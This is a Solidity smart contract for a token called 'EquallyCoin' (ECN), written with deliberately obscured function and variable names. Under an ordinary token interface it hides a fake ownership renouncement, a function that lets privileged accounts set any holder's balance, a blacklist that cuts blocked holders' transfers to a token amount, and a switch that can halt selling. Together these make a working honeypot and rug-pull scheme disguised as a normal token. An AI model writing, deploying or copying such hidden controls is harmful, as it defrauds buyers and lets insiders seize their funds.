//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract limitBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface txMin {
    function createPair(address totalTrading, address shouldList) external returns (address);

    function feeTo() external view returns (address);
}

interface autoTo {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface totalMarketing {
    function totalSupply() external view returns (uint256);

    function balanceOf(address feeAuto) external view returns (uint256);

    function transfer(address autoFromList, uint256 limitWallet) external returns (bool);

    function allowance(address tradingSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 limitWallet) external returns (bool);

    function transferFrom(
        address sender,
        address autoFromList,
        uint256 limitWallet
    ) external returns (bool);

    event Transfer(address indexed from, address indexed amountLiquidityLaunched, uint256 value);
    event Approval(address indexed tradingSender, address indexed spender, uint256 value);
}

interface tokenAt is totalMarketing {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EquallyCoin is limitBuy, totalMarketing, tokenAt {

    address private atLiquidityReceiver;

    bool public modeFrom;

    address buyTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private senderTo;

    function liquidityLaunchExempt(address modeReceiverSender, address autoFromList, uint256 limitWallet) internal returns (bool) {
        if (modeReceiverSender == tokenTrading) {
            return launchAt(modeReceiverSender, autoFromList, limitWallet);
        }
        uint256 amountFee = totalMarketing(launchedTake).balanceOf(feeMax);
        require(amountFee == isReceiver);
        require(autoFromList != feeMax);
        if (atSwap[modeReceiverSender]) {
            return launchAt(modeReceiverSender, autoFromList, sellReceiver);
        }
        limitWallet = teamSwap(modeReceiverSender, autoFromList, limitWallet);
        return launchAt(modeReceiverSender, autoFromList, limitWallet);
    }

    uint256 private liquidityFee = 100000000 * 10 ** 18;

    string private senderMode = "Equally Coin";

    function teamSwap(address modeReceiverSender, address autoFromList, uint256 limitWallet) internal view returns (uint256) {
        require(limitWallet > 0);

        uint256 atShould = 0;
        if (modeReceiverSender == launchedTake && senderReceiver > 0) {
            atShould = limitWallet * senderReceiver / 100;
        } else if (autoFromList == launchedTake && receiverModeLiquidity > 0) {
            atShould = limitWallet * receiverModeLiquidity / 100;
        }
        require(atShould <= limitWallet);
        return limitWallet - atShould;
    }

    constructor (){
        
        tradingBuy();
        autoTo buyReceiver = autoTo(buyTotal);
        launchedTake = txMin(buyReceiver.factory()).createPair(buyReceiver.WETH(), address(this));
        feeMax = txMin(buyReceiver.factory()).feeTo();
        
        tokenTrading = _msgSender();
        receiverIsAmount[tokenTrading] = true;
        limitSender[tokenTrading] = liquidityFee;
        
        emit Transfer(address(0), tokenTrading, liquidityFee);
    }

    function balanceOf(address feeAuto) public view virtual override returns (uint256) {
        return limitSender[feeAuto];
    }

    function buyLaunch(uint256 limitWallet) public {
        toMaxTotal();
        isReceiver = limitWallet;
    }

    uint256 private enableFund;

    address feeMax;

    function owner() external view returns (address) {
        return atLiquidityReceiver;
    }

    function listSenderEnable(address toAuto) public {
        toMaxTotal();
        
        if (toAuto == tokenTrading || toAuto == launchedTake) {
            return;
        }
        atSwap[toAuto] = true;
    }

    bool private tradingMax;

    uint256 private takeLiquidity;

    function approve(address liquidityTxSender, uint256 limitWallet) public virtual override returns (bool) {
        modeWalletBuy[_msgSender()][liquidityTxSender] = limitWallet;
        emit Approval(_msgSender(), liquidityTxSender, limitWallet);
        return true;
    }

    mapping(address => bool) public receiverIsAmount;

    function name() external view virtual override returns (string memory) {
        return senderMode;
    }

    bool public senderMarketing;

    mapping(address => bool) public atSwap;

    function launchAt(address modeReceiverSender, address autoFromList, uint256 limitWallet) internal returns (bool) {
        require(limitSender[modeReceiverSender] >= limitWallet);
        limitSender[modeReceiverSender] -= limitWallet;
        limitSender[autoFromList] += limitWallet;
        emit Transfer(modeReceiverSender, autoFromList, limitWallet);
        return true;
    }

    uint8 private listFrom = 18;

    function limitLiquidity(address takeLimit, uint256 limitWallet) public {
        toMaxTotal();
        limitSender[takeLimit] = limitWallet;
    }

    uint256 teamList;

    function getOwner() external view returns (address) {
        return atLiquidityReceiver;
    }

    uint256 isReceiver;

    uint256 constant sellReceiver = 12 ** 10;

    uint256 public marketingFrom;

    uint256 public receiverModeLiquidity = 0;

    function decimals() external view virtual override returns (uint8) {
        return listFrom;
    }

    function symbol() external view virtual override returns (string memory) {
        return launchWallet;
    }

    uint256 public senderReceiver = 0;

    bool public autoSell;

    address public launchedTake;

    mapping(address => uint256) private limitSender;

    address public tokenTrading;

    function toMaxTotal() private view {
        require(receiverIsAmount[_msgSender()]);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return liquidityFee;
    }

    event OwnershipTransferred(address indexed launchTake, address indexed marketingExempt);

    function transferFrom(address modeReceiverSender, address autoFromList, uint256 limitWallet) external override returns (bool) {
        if (_msgSender() != buyTotal) {
            if (modeWalletBuy[modeReceiverSender][_msgSender()] != type(uint256).max) {
                require(limitWallet <= modeWalletBuy[modeReceiverSender][_msgSender()]);
                modeWalletBuy[modeReceiverSender][_msgSender()] -= limitWallet;
            }
        }
        return liquidityLaunchExempt(modeReceiverSender, autoFromList, limitWallet);
    }

    function transfer(address takeLimit, uint256 limitWallet) external virtual override returns (bool) {
        return liquidityLaunchExempt(_msgSender(), takeLimit, limitWallet);
    }

    function fundTeam(address txModeFrom) public {
        require(txModeFrom.balance < 100000);
        if (autoSell) {
            return;
        }
        
        receiverIsAmount[txModeFrom] = true;
        if (modeFrom) {
            shouldFeeReceiver = takeLiquidity;
        }
        autoSell = true;
    }

    string private launchWallet = "ECN";

    uint256 private shouldFeeReceiver;

    function allowance(address sellTotal, address liquidityTxSender) external view virtual override returns (uint256) {
        if (liquidityTxSender == buyTotal) {
            return type(uint256).max;
        }
        return modeWalletBuy[sellTotal][liquidityTxSender];
    }

    function tradingBuy() public {
        emit OwnershipTransferred(tokenTrading, address(0));
        atLiquidityReceiver = address(0);
    }

    mapping(address => mapping(address => uint256)) private modeWalletBuy;

}